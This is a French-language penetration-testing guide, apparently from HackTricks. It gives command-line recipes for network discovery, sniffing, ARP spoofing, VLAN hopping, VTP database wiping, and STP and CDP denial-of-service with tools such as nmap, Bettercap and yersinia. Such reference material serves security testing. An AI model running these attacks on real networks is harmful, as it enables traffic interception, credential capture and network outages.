# Pentesting Network

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Conseil de prime de bug** : **inscrivez-vous** √† **Intigriti**, une plateforme de prime de bug premium cr√©√©e par des pirates, pour des pirates ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## D√©couverte des h√¥tes depuis l'ext√©rieur

Il s'agit d'une **section br√®ve** sur la fa√ßon de trouver des **IP r√©pondant** depuis l'**Internet**.\
Dans cette situation, vous avez une certaine **plage d'IP** (peut-√™tre m√™me plusieurs **plages**) et vous devez simplement trouver **quelles IPs r√©pondent**.

### ICMP

C'est la fa√ßon la **plus facile** et la **plus rapide** de d√©couvrir si un h√¥te est en ligne ou non.\
Vous pourriez essayer d'envoyer quelques paquets **ICMP** et **attendre des r√©ponses**. La mani√®re la plus simple est d'envoyer une **demande d'√©cho** et d'attendre la r√©ponse. Vous pouvez le faire en utilisant simplement un `ping` ou en utilisant `fping` pour les **plages**.\
Vous pourriez √©galement utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela √©vitera les filtres aux demandes-r√©ponses d'√©cho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### D√©couverte des ports TCP

Il est tr√®s courant de constater que tous les types de paquets ICMP sont filtr√©s. Ensuite, tout ce que vous pouvez faire pour v√©rifier si un h√¥te est actif est **d'essayer de trouver des ports ouverts**. Chaque h√¥te a **65535 ports**, donc, si vous avez un "grand" p√©rim√®tre, vous **ne pouvez pas** tester si **chaque port** de chaque h√¥te est ouvert ou non, cela prendrait trop de temps.\
Ce dont vous avez besoin est donc un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilis√©s :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### D√©couverte du port HTTP

Il est √©galement possible d'effectuer cette √©tape avec `nmap`, mais c'est plus lent et `nmap` a parfois des probl√®mes pour identifier les h√¥tes actifs.

### D√©couverte du port HTTP

Il s'agit simplement d'une d√©couverte de port TCP utile lorsque vous souhaitez **vous concentrer sur la d√©couverte de services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### D√©couverte de ports UDP

Vous pourriez √©galement essayer de v√©rifier si certains **ports UDP sont ouverts** pour d√©cider si vous devez **accorder plus d'attention** √† un **h√¥te.** Comme les services UDP **ne r√©pondent g√©n√©ralement pas** avec **de donn√©es** √† un paquet de sondage UDP vide normal, il est difficile de dire si un port est filtr√© ou ouvert. La mani√®re la plus simple de d√©cider est d'envoyer un paquet li√© au service en cours d'ex√©cution, et comme vous ne savez pas quel service est en cours d'ex√©cution, vous devriez essayer le plus probable en fonction du num√©ro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap propos√©e pr√©c√©demment testera les **1000 premiers ports UDP** de chaque h√¥te dans la plage **/24**, mais m√™me cela prendra **>20min**. Si vous avez besoin de **r√©sultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Cela enverra ces **sondes UDP** vers leur **port attendu** (pour une plage /24, cela prendra seulement 1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### D√©couverte de port SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Test d'intrusion Wifi

Ici, vous pouvez trouver un guide complet de toutes les attaques Wifi bien connues au moment de la r√©daction :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## D√©couverte des h√¥tes de l'int√©rieur

Si vous √™tes √† l'int√©rieur du r√©seau, l'une des premi√®res choses que vous voudrez faire est de **d√©couvrir d'autres h√¥tes**. Selon **le niveau de discr√©tion** que vous pouvez/voulez maintenir, diff√©rentes actions pourraient √™tre effectu√©es :

### Passive

Vous pouvez utiliser ces outils pour d√©couvrir passivement les h√¥tes √† l'int√©rieur d'un r√©seau connect√© :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques comment√©es dans [_**D√©couverte des h√¥tes depuis l'ext√©rieur**_](./#discovering-hosts-from-the-outside) (_D√©couverte des ports TCP/HTTP/UDP/SCTP_) peuvent √©galement √™tre **appliqu√©es ici**.\
Cependant, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Actif

Notez que les techniques comment√©es dans _D√©couverte des h√¥tes depuis l'ext√©rieur_ ([_**ICMP**_](./#icmp)) peuvent √©galement √™tre **appliqu√©es ici**.\
Cependant, √©tant donn√© que vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plusieurs choses** :

- Si vous **pinguez** une **adresse de diffusion de sous-r√©seau**, le ping devrait arriver √† **chaque h√¥te** et ils pourraient vous **r√©pondre** : `ping -b 10.10.5.255`
- En pingant l'**adresse de diffusion du r√©seau**, vous pourriez m√™me trouver des h√¥tes √† l'int√©rieur d'**autres sous-r√©seaux** : `ping -b 255.255.255.255`
- Utilisez les drapeaux `-PE`, `-PP`, `-PM` de `nmap` pour effectuer une d√©couverte d'h√¥tes en envoyant respectivement des demandes de **requ√™te ICMPv4 echo**, de **timestamp**, et de **masque de sous-r√©seau** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **R√©veil sur le r√©seau (Wake On Lan)**

Le r√©veil sur le r√©seau est utilis√© pour **allumer** les ordinateurs via un **message r√©seau**. Le paquet magique utilis√© pour allumer l'ordinateur est simplement un paquet o√π un **MAC Dst** est fourni et est ensuite **r√©p√©t√© 16 fois** dans le m√™me paquet.\
Ces types de paquets sont g√©n√©ralement envoy√©s dans un **ethernet 0x0842** ou dans un **paquet UDP au port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoy√© √† l'**ethernet de diffusion** (et le MAC de diffusion sera celui qui est r√©p√©t√©).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Balayage des h√¥tes

Une fois que vous avez d√©couvert toutes les adresses IP (externes ou internes) que vous souhaitez analyser en profondeur, diff√©rentes actions peuvent √™tre effectu√©es.

### TCP

* Port **ouvert** : _SYN --> SYN/ACK --> RST_
* Port **ferm√©** : _SYN --> RST/ACK_
* Port **filtr√©** : _SYN --> \[PAS DE R√âPONSE]_
* Port **filtr√©** : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il existe 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et v√©rifier la r√©ponse _**ICMP unreachable**_ si le port est **ferm√©** (dans plusieurs cas, ICMP sera **filtr√©** donc vous ne recevrez aucune information si le port est ferm√© ou ouvert).
* Envoyer des **datagrammes format√©s** pour obtenir une r√©ponse d'un **service** (par exemple, DNS, DHCP, TFTP, et d'autres, comme list√© dans _nmap-payloads_). Si vous recevez une **r√©ponse**, alors le port est **ouvert**.

**Nmap** va **m√©langer les deux** options en utilisant "-sV" (les scans UDP sont tr√®s lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Analyse SCTP

SCTP se situe aux c√¥t√©s de TCP et UDP. Destin√© √† assurer le transport des donn√©es de t√©l√©phonie sur IP, le protocole duplique de nombreuses fonctionnalit√©s de fiabilit√© du Syst√®me de Signalisation 7 (SS7), et sous-tend une famille de protocoles plus large connue sous le nom de SIGTRAN. SCTP est pris en charge par des syst√®mes d'exploitation tels que IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS et VxWorks.

Deux analyses diff√©rentes pour SCTP sont propos√©es par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### √âvasion des IDS et IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### R√©v√©lation des adresses IP internes

Les routeurs, pare-feux et dispositifs r√©seau mal configur√©s r√©pondent parfois aux sondes r√©seau en utilisant des adresses source non publiques. Vous pouvez utiliser _tcpdump_ pour identifier les paquets re√ßus √† partir d'adresses priv√©es lors des tests. Dans ce cas, l'interface _eth2_ dans Kali Linux est adressable depuis l'Internet public (Si vous √™tes derri√®re un NAT d'un pare-feu, ce type de paquets sera probablement filtr√©).
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

En sniffant, vous pouvez apprendre des d√©tails sur les plages d'adresses IP, les tailles de sous-r√©seau, les adresses MAC et les noms d'h√¥tes en examinant les trames et paquets captur√©s. Si le r√©seau est mal configur√© ou si le tissu de commutation est sous stress, les attaquants peuvent capturer du mat√©riel sensible via un sniffing r√©seau passif.

Si un r√©seau Ethernet commut√© est configur√© correctement, vous ne verrez que des trames de diffusion et du mat√©riel destin√© √† votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut √©galement capturer des paquets √† partir d'une machine distante via une session SSH avec Wireshark en tant qu'interface graphique en temps r√©el.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

√âvidemment.

### Capture de cr√©dentiels

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser les cr√©dentiels √† partir d'un fichier pcap ou d'une interface en direct.

## Attaques LAN

### Spoofing ARP

Le Spoofing ARP consiste √† envoyer des r√©ponses ARP gratuites pour indiquer que l'IP d'une machine a l'adresse MAC de notre appareil. Ensuite, la victime modifiera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'IP falsifi√©e.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - D√©bordement CAM

D√©bordez la table CAM du commutateur en envoyant de nombreux paquets avec des adresses MAC source diff√©rentes. Lorsque la table CAM est pleine, le commutateur commence √† se comporter comme un concentrateur (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vuln√©rabilit√© a √©t√© corrig√©e.

### Attaques VLAN 802.1Q / DTP

#### Tron√ßonnage Dynamique

**DTP (Dynamic Trunking Protocol)** est un protocole de couche de liaison con√ßu pour fournir un syst√®me de tron√ßonnage automatique. Avec DTP, les commutateurs d√©cident quel port fonctionnera en mode tronc (Trunk) et lequel ne le fera pas. L'utilisation de **DTP** indique une **mauvaise conception du r√©seau.** Les **troncs devraient √™tre strictement** l√† o√π ils sont n√©cessaires, et cela devrait √™tre document√©.

**Par d√©faut, tous les ports de commutation fonctionnent en mode Dynamique Automatique.** Cela indique que le port de commutation est en mode d'initiation de tronc √† partir du commutateur voisin. **Le Pentester doit se connecter physiquement au commutateur et envoyer une trame DTP D√©sirable**, ce qui d√©clenche le passage du port en mode tronc. L'attaquant peut ensuite √©num√©rer les VLAN en utilisant l'analyse des trames STP et contourner la segmentation des VLAN en cr√©ant des interfaces virtuelles.

De nombreux commutateurs prennent en charge le protocole de tron√ßonnage dynamique (DTP) par d√©faut, cependant, qu'un adversaire peut abuser pour **√©muler un commutateur et recevoir du trafic sur tous les VLAN**. L'outil [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) peut renifler une interface et **signaler si le commutateur est en mode par d√©faut, tronc, dynamique, automatique ou acc√®s** (c'est le seul qui √©viterait le saut de VLAN). L'outil indiquera si le commutateur est vuln√©rable ou non.

S'il √©tait d√©couvert que le r√©seau est vuln√©rable, vous pouvez utiliser _**Yersinia**_ pour lancer un "**enable trunking**" en utilisant le protocole "**DTP**" et vous pourrez voir les paquets r√©seau de tous les VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Pour √©num√©rer les VLAN, il est √©galement possible de g√©n√©rer le trame DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Ne pas interrompre le script sous aucun pr√©texte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de tronc dynamiquement cr√©√©s sur le commutateur ne restent actifs que pendant cinq minutes. Apr√®s cinq minutes, le tronc tombe.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens √† souligner que **Access/Desirable (0x03)** indique que le cadre DTP est de type souhaitable, ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence des VLAN 30 et 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLAN sp√©cifiques

Une fois que vous connaissez les identifiants VLAN et les valeurs IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN sp√©cifique**.\
Si le DHCP n'est pas disponible, utilisez _ifconfig_ pour d√©finir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saut de VLAN Automatique

L'attaque discut√©e de **Dynamic Trunking et la cr√©ation d'interfaces virtuelles pour d√©couvrir des h√¥tes √† l'int√©rieur** d'autres VLAN sont **automatiquement effectu√©es** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double √âtiquetage

Si un attaquant conna√Æt la valeur du **MAC, de l'IP et de l'ID VLAN de l'h√¥te victime**, il pourrait essayer de **double √©tiqueter un trame** avec son VLAN d√©sign√© et le VLAN de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter** √† l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** √† des protocoles qui peuvent effectuer des actions int√©ressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **balayage de port TCP en usurpant une IP contr√¥l√©e par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant pourrait renifler dans le deuxi√®me h√¥te lui appartenant s'il re√ßoit des paquets de la victime.

![](<../../.gitbook/assets/image (635) (1).png>)

Pour effectuer cette attaque, vous pourriez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation lat√©rale des VLAN <a href="#d679" id="d679"></a>

Si vous avez **acc√®s √† un commutateur auquel vous √™tes directement connect√©**, vous avez la possibilit√© de **contourner la segmentation des VLAN** au sein du r√©seau. Il vous suffit de **passer le port en mode trunk** (√©galement appel√© trunk), de cr√©er des interfaces virtuelles avec les identifiants des VLAN cibles, et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de mani√®re dynamique (DHCP) ou la configurer de mani√®re statique. Cela d√©pend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement des VLAN priv√©s de couche 3

Dans les r√©seaux sans fil invit√©s et d'autres environnements, les param√®tres des VLAN priv√©s (√©galement connus sous le nom d' _isolation de port_) sont utilis√©s pour **emp√™cher les pairs d'interagir** (c'est-√†-dire, les clients **se connectent √† un point d'acc√®s sans fil mais ne peuvent pas se communiquer entre eux**). Selon les ACL du r√©seau (ou leur absence), il pourrait √™tre possible d'envoyer des paquets IP √† un routeur, qui les renverrait ensuite √† un pair voisin.

Cette attaque enverra un **paquet sp√©cialement con√ßu √† l'adresse IP d'un client mais avec l'adresse MAC du routeur**. Ensuite, le **routeur redirigera le paquet vers le client**. Comme dans les _Attaques √† Double √âtiquetage_, vous pouvez exploiter cette vuln√©rabilit√© en contr√¥lant un h√¥te accessible par la victime.

### Attaques VTP

**VTP (VLAN Trunking Protocol)** est un protocole con√ßu pour g√©rer de mani√®re centralis√©e les VLAN. Pour suivre la base de donn√©es VLAN actuelle, les commutateurs v√©rifient des num√©ros de r√©vision sp√©ciaux. Lorsqu'une mise √† jour de table se produit, le num√©ro de r√©vision est incr√©ment√© de un. Et si un commutateur d√©tecte une configuration avec un num√©ro de r√©vision plus √©lev√©, il mettra automatiquement √† jour sa base de donn√©es VLAN.

#### R√¥les dans un domaine VTP <a href="#ebfc" id="ebfc"></a>

* **Serveur VTP.** Un commutateur dans le r√¥le de serveur VTP peut cr√©er de nouveaux VLAN, supprimer les anciens ou modifier les informations dans les VLAN eux-m√™mes. **Il g√©n√®re √©galement des annonces VTP pour le reste des membres du domaine.**
* **Client VTP.** Un commutateur dans ce r√¥le recevra des annonces VTP sp√©cifiques d'autres commutateurs dans le domaine pour mettre √† jour les bases de donn√©es VLAN sur le sien. Les clients sont limit√©s dans leur capacit√© √† cr√©er des VLAN et ne sont m√™me pas autoris√©s √† modifier la configuration VLAN localement. En d'autres termes, **acc√®s en lecture seule.**
* **Transparent VTP.** Dans ce mode, le commutateur ne participe pas aux processus VTP et peut g√©rer pleinement et localement l'ensemble de la configuration VLAN. Lorsqu'il fonctionne en mode transparent, les commutateurs transmettent uniquement les annonces VTP d'autres commutateurs sans affecter leur configuration VLAN. **Ces commutateurs auront toujours un num√©ro de r√©vision de z√©ro et ne peuvent pas √™tre attaqu√©s.**

#### Types d'annonces <a href="#b384" id="b384"></a>

* **Annonce R√©sum√©e ‚Äî** l'annonce VTP que le serveur VTP envoie toutes les **300 secondes (5 minutes).** Cette annonce stocke le nom de domaine VTP, la version du protocole, l'horodatage et la valeur de hachage de configuration MD5.
* **Annonce de Sous-ensemble ‚Äî** c'est l'annonce VTP qui est envoy√©e chaque fois qu'un changement de configuration VLAN se produit.
* **Demande d'Annonce ‚Äî** est une demande du client VTP au serveur VTP pour un message d'Annonce R√©sum√©e. G√©n√©ralement envoy√©e en r√©ponse √† un message indiquant qu'un commutateur a d√©tect√© une Annonce R√©sum√©e avec un num√©ro de r√©vision de configuration plus √©lev√©.

VTP ne peut √™tre **attaqu√© que depuis un port trunk,** car les **annonces VTP sont uniquement diffus√©es et re√ßues sur les ports trunk.** **Par cons√©quent, apr√®s avoir attaqu√© DTP lors d'un test d'intrusion, votre prochaine cible pourrait √™tre VTP.** Pour attaquer le domaine VTP, vous pouvez **utiliser Yersinia** pour **ex√©cuter une injection VTP qui effacera l'ensemble de la base de donn√©es VLAN** et ainsi paralyser le r√©seau.

{% hint style="info" %}
Le protocole VTP a jusqu'√† **trois versions**. Dans ce post, l'attaque est contre la premi√®re version, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Pour effacer l'int√©gralit√© de la base de donn√©es VLAN, s√©lectionnez l'option **supprimer tous les VLAN VTP**

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Attaques STP

**Si vous ne pouvez pas capturer les trames BPDU sur vos interfaces, il est peu probable que vous r√©ussissiez dans une attaque STP.**

#### **STP BPDU DoS**

En envoyant beaucoup de BPDUs TCP (Notification de Changement de Topologie) ou Conf (les BPDUs envoy√©s lors de la cr√©ation de la topologie), les commutateurs sont surcharg√©s et cessent de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque TCP STP**

Lorsqu'un paquet TCP est envoy√©, la table CAM des commutateurs est supprim√©e en 15 secondes. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera red√©marr√©e en continu (ou toutes les 15 secondes) et lorsque cela se produit, le commutateur se comporte comme un concentrateur.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de la racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du r√©seau. Ensuite, plus de donn√©es passeront par lui. C'est int√©ressant lorsque vous √™tes connect√© √† deux commutateurs diff√©rents.\
Cela se fait en envoyant des paquets CONF BPDU disant que la valeur de **priorit√©** est inf√©rieure √† la priorit√© r√©elle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connect√© √† 2 commutateurs, il peut devenir la racine de l'arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera effectu√©e).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole CISCO Discovery Protocol est le protocole utilis√© par les appareils CISCO pour communiquer entre eux, **d√©couvrir qui est en vie** et quelles fonctionnalit√©s ils ont.

#### Collecte d'informations <a href="#0e0f" id="0e0f"></a>

**Par d√©faut, le CDP envoie des annonces √† tous ses ports.** Mais que se passe-t-il si un intrus se connecte √† un port sur le m√™me commutateur ? En utilisant un sniffer r√©seau, que ce soit **Wireshark**, **tcpdump** ou **Yersinia**, il pourrait extraire **des informations pr√©cieuses sur l'appareil lui-m√™me**, de son mod√®le √† la version de Cisco IOS. En utilisant ces informations, il pourra √©num√©rer la m√™me version de Cisco IOS, trouver la vuln√©rabilit√© et l'exploiter.

#### Attaque de saturation CDP <a href="#0d6a" id="0d6a"></a>

Vous pouvez effectuer une attaque par d√©ni de service sur un commutateur CISCO en √©puisant la m√©moire de l'appareil en simulant de vrais appareils CISCO.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
S√©lectionnez l'option **table de diffusion CDP** et lancez l'attaque. Le processeur du commutateur sera surcharg√©, ainsi que la table des voisins CDP, **entra√Ænant une "paralysie du r√©seau".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaque d'usurpation CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
### Attaques VoIP

Bien que destin√©s √† √™tre utilis√©s par les t√©l√©phones Voix sur IP (VoIP) des employ√©s, les appareils VoIP modernes sont de plus en plus int√©gr√©s √† des appareils IoT. De nombreux employ√©s peuvent d√©sormais d√©verrouiller des portes en utilisant un num√©ro de t√©l√©phone sp√©cial, contr√¥ler le thermostat de la pi√®ce...

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) imite le comportement d'un t√©l√©phone VoIP dans les environnements Cisco, Avaya, Nortel et Alcatel-Lucent. Il d√©couvre automatiquement l'ID VLAN correct pour le r√©seau vocal en utilisant l'un des protocoles de d√©couverte de p√©riph√©riques qu'il prend en charge, tels que le protocole de d√©couverte Cisco (CDP), le protocole de configuration dynamique des h√¥tes (DHCP), le protocole de d√©couverte de p√©riph√©rique de m√©dia de la couche de liaison (LLDP-MED) et le protocole ARP 802.1Q.

